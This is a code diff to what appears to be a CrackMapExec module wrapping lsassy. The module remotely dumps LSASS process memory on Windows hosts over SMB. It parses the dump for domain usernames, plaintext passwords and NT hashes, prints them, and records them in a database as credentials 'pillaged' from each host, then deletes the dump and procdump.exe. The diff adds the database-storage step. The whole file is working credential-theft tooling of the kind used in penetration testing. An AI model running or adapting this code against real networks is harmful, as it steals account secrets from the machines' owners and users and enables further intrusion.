@@ -114,13 +114,13 @@ class CMEModule:
 
         When CME is py3.6 compatible, CME connection object will be reused.
         """
-        domainName = connection.domain
-        userName = connection.username
+        domain_name = connection.domain
+        username = connection.username
         password = connection.password if connection.password is not None else connection.nthash
         host = connection.host
         
         py_arg = "{}/{}:{}@{}:/{}{}".format(
-                    domainName, userName, password, host, self.share, os.path.join(self.tmp_dir, machine_name)
+                    domain_name, username, password, host, self.share, os.path.join(self.tmp_dir, machine_name)
                 ).replace("\\", "/")
         
         command = r"lsassy {}".format(py_arg, self.procdump_path + machine_name)
@@ -133,12 +133,13 @@ class CMEModule:
             # Debug output
             context.log.error('Error while execute lsassy, try with --verbose to see details')
             context.log.debug('Detailed error : {}'.format(err))
-            return code
+        else:
+            credentials = self.parse_output(out)
+            hostid = context.db.get_computers(connection.host)[0][0]
+            for credential in credentials:
+                self.display_credentials(context, credential)
+                self.add_credentials_to_db(context, credential, hostid)
 
-        credentials = self.parse_output(out)
-        for credential in credentials:
-            context.log.highlight("%s\\%s:%s" % credential)
-        
         # Delete lsass dump
         try:
             connection.conn.deleteFile(self.share, self.tmp_dir + machine_name)
@@ -152,18 +153,7 @@ class CMEModule:
             context.log.success('Deleted procdump.exe')
         except Exception as e:
             context.log.error('Error deleting procdump.exe : {}'.format(e))
-            
-    
-    def parse_output(self, output):
-        regex = r"(?:username:? (?!NA)(?P<username>.+[^\$])\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
-        matches = re.finditer(regex, output, re.MULTILINE | re.IGNORECASE)
-        credentials= []
-        for match in matches:
-            domain = match.group("domain")
-            username = match.group("username")
-            password = match.group("password") or match.group("hash")
-            credentials.append((domain.decode('utf-8'), username.decode('utf-8'), password.decode('utf-8')))
-        return set(credentials)
+
 
     def run(self, cmd):
         proc = subprocess.Popen(['/bin/sh', '-c', cmd],
@@ -173,3 +163,38 @@ class CMEModule:
         stdout, stderr = proc.communicate()
      
         return proc.returncode, stdout, stderr
+
+
+    def parse_output(self, output):
+        regex = r"(?:username:? (?!NA)(?P<username>.+[^\$])\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
+        matches = re.finditer(regex, output, re.MULTILINE | re.IGNORECASE)
+        credentials= []
+        for match in matches:
+            domain = match.group("domain")
+            username = match.group("username")
+            password = match.group("password")
+            nthash = match.group("hash")
+            credentials.append((domain, username, password, nthash))
+        return set(credentials)
+    
+
+    def display_credentials(self, context, credentials):
+        domain, username, password, nthash = credentials
+        domain = domain.decode('utf-8')
+        username = username.decode('utf-8')
+        if password is not None:
+            password = password.decode('utf-8')
+        if nthash is not None:
+            nthash = nthash.decode('utf-8')
+        context.log.highlight("%s\\%s:%s" % (domain, username, password if password else nthash))
+    
+
+    def add_credentials_to_db(self, context, credentials, hostid):
+        domain, username, password, nthash = credentials
+        if password is not None:
+            credtype = 'plaintext'
+        else:
+            credtype = 'hash'
+            password = nthash
+
+        context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)
